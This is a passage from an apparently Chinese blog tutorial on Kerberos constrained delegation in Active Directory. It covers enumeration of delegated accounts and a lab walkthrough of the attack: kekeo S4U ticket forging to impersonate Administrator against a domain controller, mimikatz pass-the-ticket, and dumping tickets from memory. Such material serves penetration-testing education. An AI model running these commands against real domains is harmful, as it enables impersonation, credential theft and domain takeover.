<h4 id="仅使用-kerberosk"><a href="#仅使用-kerberosk" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:仅使用-kerberosk" class="headings">仅使用 Kerberos(K)</a></h4>
<p>仅用 Kerberos 协议进行身份验证，不支持协议转换。置了仅使用 Kerberos(K) 约束性委派的机器账号和服务账号的 <code>userAccountControl</code> 属性与正常账号一样，但是其 <code>msDS- AllowedToDelegateTo</code> 属性会有允许被委派的服务的 SPN。</p>
<p><img src="https://oss.zjun.info/zjun.info/202202161538248.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216153800108"></p>
<h4 id="使用任何身份验证协议-n"><a href="#使用任何身份验证协议-n" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:使用任何身份验证协议-n" class="headings">使用任何身份验证协议 (N)</a></h4>
<p>支持协议的转换。</p>
<ul>
<li>配置了使用任何身份验证协议 (N) 约束性委派的机器账号的<code>userAccountControl</code>属性有个 FLAG 位 <code>WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是<code>0x1001000=16781312</code>。并且其<code>msDS-AllowedToDelegateTo</code>属性会有允许被委派的服务的 SPN。</li>
</ul>
<p><img src="https://oss.zjun.info/zjun.info/202202201422243.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216154517798"></p>
<p><img src="https://oss.zjun.info/zjun.info/202202161543696.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216154332701"></p>
<ul>
<li>配置了使用任何身份验证协议 (N) 约束性委派的服务账号的<code>userAccountControl</code>属性有个 FLAG 位<code>NORMAL_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是<code>0x1000200=16777728</code>。并且其<code>msDS-AllowedToDelegateTo</code>属性会有允许被委派的服务的 SPN。</li>
</ul>
<p><img src="https://oss.zjun.info/zjun.info/202202201422517.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216155151431"></p>
<p><img src="https://oss.zjun.info/zjun.info/202202201422985.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216155317469"></p>
<h3 id="查询约束性委派的计算机或服务账号"><a href="#查询约束性委派的计算机或服务账号" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:查询约束性委派的计算机或服务账号" class="headings">查询约束性委派的计算机或服务账号</a></h3>
<h4 id="powerview-1"><a href="#powerview-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:powerview-1" class="headings">PowerView</a></h4>
<p>PowerView 有几个不同的版本，这里用的是 PowerShellMafia 下的，脚本地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 导入 PowerView 脚本</span>
</span></span><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询域内约束性委派的计算机</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span> <span class="n">-Domain</span> <span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span> <span class="nb">fl
</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
</span></span><span class="line"><span class="cl"><span class="c"># 查询域内非约束性委派的服务账号</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span> <span class="n">-Domain</span> <span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span> <span class="nb">fl
</span></span></span></code></pre></div><h4 id="adfind-1"><a href="#adfind-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:adfind-1" class="headings">Adfind</a></h4>
<p>下载地址：<a href="https://oss.zjun.info/file/AdFind.exe" target="_blank" rel="noopener">https://oss.zjun.info/file/AdFind.exe</a></p>
<p>该工具不需要账号密码即可查询，其他支持 ldap 协议的工具也可以实现查询。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查询域内约束性委派的计算机</span>
</span></span><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=zjun,DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34;</span> <span class="n">-dn</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询非束性委派的服务账号</span>
</span></span><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=zjun,DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34;</span> <span class="n">-dn</span>
</span></span></code></pre></div><h4 id="ldapsearch-1"><a href="#ldapsearch-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:ldapsearch-1" class="headings">ldapsearch</a></h4>
<p>kali 内置，其他系统安装</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Ubuntu 用户安装</span>
</span></span><span class="line"><span class="cl">sudo apt install ldap-utils
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># mac 用户安装</span>
</span></span><span class="line"><span class="cl">brew install ldapvi
</span></span></code></pre></div><p>该工具需要域内任意用户的账号密码，可在域外查询。其他支持 ldap 协议的工具也可以实现查询。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查询域内约束性委派的计算机</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">86</span><span class="p">.</span><span class="n">136</span><span class="err">:</span><span class="n">389</span> <span class="n">-D</span> <span class="s2">&#34;test@zjun.com&#34;</span> <span class="n">-w</span> <span class="s2">&#34;P@ssw0rd&#34;</span> <span class="n">-b</span> <span class="n">dc</span><span class="p">=</span><span class="n">zjun</span><span class="p">,</span><span class="n">dc</span><span class="p">=</span><span class="n">com</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34;</span> <span class="p">|</span><span class="n">grep</span> <span class="n">-iE</span> <span class="s2">&#34;distinguishedName|allowedtodelegateto&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询非束性委派的服务账号</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">86</span><span class="p">.</span><span class="n">136</span><span class="err">:</span><span class="n">389</span> <span class="n">-D</span> <span class="s2">&#34;test@zjun.com&#34;</span> <span class="n">-w</span> <span class="s2">&#34;P@ssw0rd&#34;</span> <span class="n">-b</span> <span class="n">dc</span><span class="p">=</span><span class="n">zjun</span><span class="p">,</span><span class="n">dc</span><span class="p">=</span><span class="n">com</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34;</span> <span class="p">|</span><span class="n">grep</span> <span class="n">-iE</span> <span class="s2">&#34;distinguishedName|allowedtodelegateto&#34;</span>
</span></span></code></pre></div><h3 id="约束性委派攻击"><a href="#约束性委派攻击" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:约束性委派攻击" class="headings">约束性委派攻击</a></h3>
<p>服务用户只能获取某个用户（或主机）的服务的 ST，所以只能模拟用户访问特定的服务，是无法获取用户的 TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者 <code>NTLM Hash</code> ，我们就可以伪造 S4U 请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的 ST。</p>
<p>已经知道服务用户明文的条件下，我们可以用<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>请求该用户的 TGT</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># kekeo</span>
</span></span><span class="line"><span class="cl"><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="n">P</span><span class="nv">@ssw0rd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 得到服务用户 test 的 TGT: TGT_test@ZJUN.COM_krbtgt~zjun.com@ZJUN.COM.kirbi</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202162006580.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216200623322"></p>
<p>使用这张 TGT 通过伪造 S4U 请求以 <code>administrator</code> 用户身份请求访问 <code>P-DC CIFS</code> 的 ST</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># kekeo</span>
</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="n">TGT_test</span><span class="nv">@ZJUN</span><span class="p">.</span><span class="n">COM_krbtgt</span><span class="p">~</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span><span class="nv">@ZJUN</span><span class="p">.</span><span class="n">COM</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span><span class="nv">@zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">P-DC</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># S4U2self 的 ST1: TGS_Administrator@zjun.com@ZJUN.COM_test@ZJUN.COM.kirbi</span>
</span></span><span class="line"><span class="cl"><span class="c"># S4U2proxy 的 ST2: TGS_Administrator@zjun.com@ZJUN.COM_cifs~P-DC.zjun.com@ZJUN.COM.kirbi</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202162032172.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216203250259"></p>
<p><code>S4U2Self</code> 获取到的 ST1 和 <code>S4U2Proxy</code> 获取到的域控 P-DC CIFS 服务的 ST2 会保存在当前目录下，然后用 mimikatz 将 ST2 导入当前会话，即可成功访问域控 <code>P-DC</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># mimikatz</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_Administrator</span><span class="nv">@zjun</span><span class="p">.</span><span class="n">com</span><span class="nv">@ZJUN</span><span class="p">.</span><span class="n">COM_cifs</span><span class="p">~</span><span class="nb">P-DC</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span><span class="nv">@ZJUN</span><span class="p">.</span><span class="n">COM</span><span class="p">.</span><span class="n">kirbi</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202201426656.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216210106299"></p>
<p><img src="https://oss.zjun.info/zjun.info/202202201421194.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216210137895"></p>
<p>如果不知道服务用户明文的情况下，kekeo 同样也支持使用 NTLM Hash，在请求服务用户的 TGT 那步直接把 <code>/password</code> 改成 <code>/NTLM</code> 即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># kekeo</span>
</span></span><span class="line"><span class="cl"><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">NTLM</span><span class="err">:</span><span class="n">e19ccf75ee54e06b06a5907af13cef42</span>
</span></span></code></pre></div><p>如果不知道服务用户的明文和 NTLM Hash，但是已有服务用户登陆的主机的本地管理员权限，可以用 mimikatz 直接从内存中把服务用户的 TGT 导出</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::tickets /export&#34;</span> <span class="n">exit</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202162118805.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216211846338"></p>
<p>服务用户的 TGT 导出后，就可以通过伪造 S4U 请求以 <code>administrator</code> 用户身份请求访问 <code>P-DC CIFS</code> 的 ST</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># kekeo</span>
</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">8f613</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">40e10000-test</span><span class="nv">@krbtgt</span><span class="n">-ZJUN</span><span class="p">.</span><span class="n">COM</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span><span class="nv">@zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">P-DC</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span>
</span></span></code></pre></div><h2 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于资源的约束性委派" class="headings">基于资源的约束性委派</a></h2>
<p>如果约束性委派，必须拥有 <code>SeEnableDelegationPrivilege</code> 权限，该特权是敏感的，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束性委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能在运行 Windows Server 2012 及以上的域控制器上配置，约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林。</p>
